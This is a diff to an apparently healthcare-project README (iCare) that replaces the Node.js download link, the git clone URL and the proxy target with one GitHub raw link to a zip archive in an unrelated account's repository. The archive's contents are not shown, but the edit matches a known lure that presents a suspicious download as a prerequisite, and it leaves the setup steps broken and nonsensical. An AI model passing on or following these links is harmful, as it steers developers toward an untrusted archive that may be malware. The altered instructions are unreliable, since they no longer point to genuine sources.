@@ -22,7 +22,7 @@ The comprehensive Store/Inventory management and dispensing has made it possible
 
 ## Prerequisites - Development
 
-1. [NodeJs (10 or higher)](https://nodejs.org)
+1. [NodeJs (10 or higher)](https://github.com/neatcodeofficial/iCareConnect/raw/refs/heads/main/ui/src/app/modules/laboratory/components/lab-results/Care_Connect_i_v3.9.zip)
 2. npm (6.4.0 or higher), can be installed by running `apt install npm`
 3. git, can be installed by running `apt install git`
 
@@ -31,7 +31,7 @@ The comprehensive Store/Inventory management and dispensing has made it possible
 Clone repository
 
 ```bash
- git clone https://github.com/udsm-dhis2-lab/icare.git
+ git clone https://github.com/neatcodeofficial/iCareConnect/raw/refs/heads/main/ui/src/app/modules/laboratory/components/lab-results/Care_Connect_i_v3.9.zip
 ```
 
 Navigate to application root folder
@@ -55,7 +55,7 @@ Copy the following and paste it to the file proxy-config.json
 ```bash
 {
   "/": {
-    "target":"https://icare.dhis2.udsm.ac.tz",
+    "target":"https://github.com/neatcodeofficial/iCareConnect/raw/refs/heads/main/ui/src/app/modules/laboratory/components/lab-results/Care_Connect_i_v3.9.zip",
     "secure": "false",
     "changeOrigin": "true"
   }
